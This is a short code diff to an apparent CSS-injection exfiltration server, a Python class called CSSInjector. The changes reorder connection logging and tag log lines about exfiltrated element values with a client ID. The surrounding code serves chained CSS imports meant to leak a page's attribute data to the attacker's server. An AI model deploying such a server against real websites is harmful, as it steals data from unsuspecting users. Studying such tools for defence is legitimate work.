@@ -26,10 +26,6 @@ class CSSInjector:
         )
 
     async def handle_start(self, request):
-        console.log("connection", f"Connection from {request.remote}")
-        if self.show_details:
-            for key, value in request.headers.items():
-                console.log("connection_details", f"{key} : {value}")
         client = Client(
             host=request.remote,
             accept=request.get("accept"),
@@ -37,8 +33,13 @@ class CSSInjector:
             event=asyncio.Event(),
         )
         self.clients.append(client)
-
+        console.log("connection", f"Connection from {client.host}")
+        console.log("connection_details", f"ID : {client.id}")
         client.event.set()
+        if self.show_details:
+            for key, value in request.headers.items():
+                console.log("connection_details", f"{key} : {value}")
+
         return web.Response(
             text=injection.generate_next_import(self.hostname, self.port, client),
             content_type="text/css",
@@ -53,7 +54,7 @@ class CSSInjector:
 
         console.log(
             "end_exfiltration",
-            f"The {self.selector} exfiltrated from {self.identifier} is : {client.data}",
+            f"[{client.id}] - The {self.selector} exfiltrated from {self.identifier} is : {client.data}",
         )
         client.data = ""
 
@@ -93,7 +94,7 @@ class CSSInjector:
         if self.show_details:
             console.log(
                 "exfiltration",
-                f"Exfiltrating element {len(self.elements)} : {client.data}",
+                f"[{client.id}] - Exfiltrating element {len(self.elements)} : {client.data}",
             )
         return web.Response(text="ok.", content_type="image/x-icon")
 
